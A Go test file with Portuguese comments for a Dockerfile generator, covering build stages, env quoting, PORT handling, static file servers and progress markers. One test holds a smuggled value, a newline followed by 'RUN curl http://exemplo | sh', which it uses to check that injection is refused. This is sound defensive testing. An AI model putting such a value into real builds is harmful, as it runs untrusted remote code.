// Testes do gerador de Dockerfile e das marcas de progresso.
//
// Cada um dos três consertos herdados da revisão do repositório pai tem teste
// que FALHA sem ele: site estático sem CMD, $PORT inexistente no runtime e
// env de build com quebra de linha. O quarto — o servidor de arquivos numa
// imagem sem npm — é a correção nova desta porta, e o teste do Blazor a fixa.
package ship

import (
	"regexp"
	"strings"
	"testing"
)

func mustDockerfile(t *testing.T, stack Stack, options Options) string {
	t.Helper()
	output, err := Dockerfile(stack, options)
	if err != nil {
		t.Fatalf("Dockerfile(%s): %v", stack.Name, err)
	}
	return output
}

func runLines(output string) []string {
	var runs []string
	for _, line := range strings.Split(output, "\n") {
		if strings.HasPrefix(line, "RUN ") {
			runs = append(runs, line)
		}
	}
	return runs
}

func TestMultiStageWhenBuildAndRuntimeDiffer(t *testing.T) {
	output := mustDockerfile(t, mustStack(t, "go"), Options{
		InstallCommand: "go mod download",
		BuildCommand:   "go build -o app .",
	})
	if !strings.Contains(output, "AS builder") {
		t.Error("faltou o estágio de build")
	}
	if !strings.Contains(output, "AS runtime") {
		t.Error("faltou o estágio de runtime")
	}
	// ProductionPaths do Go é ["app"] — o binário, não a árvore inteira.
	if !strings.Contains(output, "COPY --from=builder /workspace/app /app/app") {
		t.Errorf("a cópia de produção não levou só o binário:\n%s", output)
	}
	if !strings.Contains(output, "EXPOSE 8080") {
		t.Error("faltou EXPOSE 8080")
	}
}

func TestSingleStageWhenImagesAreTheSame(t *testing.T) {
	output := mustDockerfile(t, mustStack(t, "nextjs"), Options{BuildCommand: "next build"})
	if strings.Contains(output, "AS builder") {
		t.Error("nextjs constrói e roda na mesma imagem — não deveria ter estágio de build")
	}
	if !strings.Contains(output, "EXPOSE 3000") {
		t.Error("faltou EXPOSE 3000")
	}
	if !strings.Contains(output, `CMD ["sh", "-c", "next start"]`) {
		t.Errorf("faltou o CMD com next start:\n%s", output)
	}
}

func TestInstallAndBuildShareOneRunWithProgressMarks(t *testing.T) {
	output := mustDockerfile(t, mustStack(t, "nextjs"), Options{
		InstallCommand: "npm ci",
		BuildCommand:   "next build",
	})
	runs := runLines(output)
	if len(runs) != 1 {
		t.Fatalf("esperava UM RUN (uma layer), obtive %d:\n%s", len(runs), output)
	}
	for _, mark := range []string{
		"step=install status=running",
		"step=install status=completed",
		"step=build status=completed",
	} {
		if !strings.Contains(runs[0], mark) {
			t.Errorf("o RUN não imprime a marca %q", mark)
		}
	}
}

func TestNoColorEntersAloneAndTermStaysOut(t *testing.T) {
	output := mustDockerfile(t, mustStack(t, "nextjs"), Options{
		BuildCommand: "next build",
		Env:          map[string]string{"TERM": "xterm-256color", "API_URL": "https://exemplo"},
	})
	if !strings.Contains(output, "export NO_COLOR='1'") {
		t.Error("NO_COLOR não entrou sozinho")
	}
	if !strings.Contains(output, "export API_URL='https://exemplo'") {
		t.Error("API_URL não foi exportada")
	}
	if strings.Contains(output, "TERM=") {
		t.Error("TERM viajou para o build")
	}
}

func TestSingleQuotesDoNotEscapeTheShell(t *testing.T) {
	output := mustDockerfile(t, mustStack(t, "nextjs"), Options{
		BuildCommand: "next build",
		Env:          map[string]string{"NOTA": "o'brien"},
	})
	if !strings.Contains(output, `export NOTA='o'\''brien'`) {
		t.Errorf("a aspa simples não foi escapada:\n%s", output)
	}
}

func TestMonorepoSubfolderBecomesBuildWorkdir(t *testing.T) {
	output := mustDockerfile(t, mustStack(t, "nextjs"), Options{
		SourceDir:    "apps/web",
		BuildCommand: "next build",
	})
	if !strings.Contains(output, "WORKDIR /workspace/apps/web") {
		t.Errorf("a subpasta do monorepo não virou WORKDIR:\n%s", output)
	}
}

func TestEnvValueWithNewlineIsRefused(t *testing.T) {
	// O conserto herdado, endurecido nesta porta: quebra de linha num valor
	// encerraria o RUN e a linha seguinte viraria instrução Dockerfile por
	// conta própria. A porta TS trocava por espaço em silêncio; aqui a geração
	// RECUSA — valor alterado sem aviso é outro tipo de mentira.
	output, err := Dockerfile(mustStack(t, "nextjs"), Options{
		BuildCommand: "next build",
		Env:          map[string]string{"CHAVE": "linha1\nRUN curl http://exemplo | sh"},
	})
	if err == nil {
		t.Fatalf("valor com quebra de linha foi aceito:\n%s", output)
	}
	if !strings.Contains(err.Error(), "CHAVE") {
		t.Errorf("a recusa não diz QUAL variável tem o problema: %v", err)
	}
	if output != "" {
		t.Error("a recusa veio acompanhada de um Dockerfile — recusa é recusa")
	}

	// Retorno de carro escaparia pelo mesmo buraco.
	if _, err := Dockerfile(mustStack(t, "nextjs"), Options{
		BuildCommand: "next build",
		Env:          map[string]string{"OUTRA": "valor\rquebrado"},
	}); err == nil {
		t.Error("valor com retorno de carro foi aceito")
	}
}

func TestPortExistsInRuntime(t *testing.T) {
	// dotnet traz `ASPNETCORE_URLS=http://0.0.0.0:$PORT` no comando de start.
	// Sem `ENV PORT`, o servidor subia escutando em ":" e morria na largada.
	output := mustDockerfile(t, mustStack(t, "dotnet"), Options{BuildCommand: "dotnet publish"})
	if !strings.Contains(output, "ENV PORT=") {
		t.Fatalf("faltou ENV PORT no runtime:\n%s", output)
	}
	match := regexp.MustCompile(`ENV PORT=(\d+)`).FindStringSubmatch(output)
	if match == nil {
		t.Fatal("ENV PORT sem número")
	}
	if !strings.Contains(output, "EXPOSE "+match[1]) {
		t.Errorf("EXPOSE e ENV PORT divergem:\n%s", output)
	}
	if !strings.Contains(output, "$PORT") {
		t.Error("o comando de start do dotnet perdeu o $PORT")
	}
}

func TestStaticStackGetsAFileServerNotADeadImage(t *testing.T) {
	// Vite/Angular/CRA constroem para uma pasta e não têm processo para
	// subir. Antes o gerador não emitia CMD nenhum: `docker run` terminava na
	// hora.
	output := mustDockerfile(t, mustStack(t, "vite"), Options{BuildCommand: "vite build"})
	if !strings.Contains(output, "http-server dist -p $PORT -s") {
		// `-s` é o fallback para index.html: sem ele, recarregar uma rota de
		// SPA que não seja a raiz devolve 404.
		t.Errorf("faltou o servidor de arquivos:\n%s", output)
	}
	if !strings.Contains(output, "CMD [") {
		t.Errorf("imagem estática sem CMD termina o docker run na hora:\n%s", output)
	}
}

func TestFileServerForcesAnImageWithNpm(t *testing.T) {
	// A correção NOVA desta porta: o Blazor wasm é estático, mas o runtime da
	// linguagem é aspnet — sem npm, o `RUN npm install -g http-server`
	// quebrava o docker build. O estágio de runtime vira node:22, e a cópia
	// do builder continua vindo do SDK do .NET.
	output := mustDockerfile(t, mustStack(t, "blazor"), Options{BuildCommand: "dotnet publish -c Release -o publish"})
	if !strings.Contains(output, "FROM mcr.microsoft.com/dotnet/sdk:8.0 AS builder") {
		t.Errorf("o build do Blazor deixou de usar o SDK:\n%s", output)
	}
	if !strings.Contains(output, "FROM node:22 AS runtime") {
		t.Errorf("o runtime estático precisa de npm para o http-server:\n%s", output)
	}
	if strings.Contains(output, "aspnet:8.0 AS runtime") {
		t.Error("a imagem aspnet não tem npm — o RUN npm install quebraria o build")
	}
	if !strings.Contains(output, "COPY --from=builder /workspace/publish/wwwroot /app/publish/wwwroot") {
		t.Errorf("a cópia de produção do Blazor se perdeu:\n%s", output)
	}
	if !strings.Contains(output, "http-server publish/wwwroot -p $PORT -s") {
		t.Errorf("o servidor não aponta para o bundle wasm:\n%s", output)
	}
}

func TestProjectWithItsOwnDockerfileIsNotOverwritten(t *testing.T) {
	output := mustDockerfile(t, mustStack(t, "docker"), Options{})
	for _, line := range strings.Split(output, "\n") {
		if strings.HasPrefix(line, "CMD ") {
			t.Errorf("projeto com Dockerfile próprio recebeu CMD por cima:\n%s", output)
		}
	}
	if !strings.Contains(output, "use o do repositório") {
		t.Errorf("faltou a instrução de usar o Dockerfile do repositório:\n%s", output)
	}
}

func TestEmptyStackIsRefusedWithReason(t *testing.T) {
	if _, err := Dockerfile(Stack{}, Options{}); err == nil {
		t.Fatal("stack zerada geraria FROM vazio — tinha de recusar")
	}
}

/* --------------------------- marcas de progresso -------------------------- */

func TestBuildEventRoundTrips(t *testing.T) {
	line := FormatBuildEvent(StepBuild, StatusCompleted)
	step, status, ok := ParseBuildEvent(line)
	if !ok {
		t.Fatalf("a marca %q não foi reconhecida de volta", line)
	}
	if step != StepBuild || status != StatusCompleted {
		t.Errorf("marca voltou como %s/%s, esperava build/completed", step, status)
	}
}

func TestOrdinaryLineIsNotAMark(t *testing.T) {
	if _, _, ok := ParseBuildEvent("npm warn deprecated"); ok {
		t.Error("linha comum virou marca")
	}
	if _, _, ok := ParseBuildEvent(""); ok {
		t.Error("linha vazia virou marca")
	}
}

func TestCompletedStepIsWorthTenMorePoints(t *testing.T) {
	if got := ProgressForStep("install", ""); got != 30 {
		t.Errorf("install = %d, esperava 30", got)
	}
	if got := ProgressForStep("install", StatusCompleted); got != 40 {
		t.Errorf("install concluído = %d, esperava 40", got)
	}
	if got := ProgressForStep("passo-que-nao-existe", ""); got != 0 {
		t.Errorf("passo desconhecido = %d, esperava 0", got)
	}
}
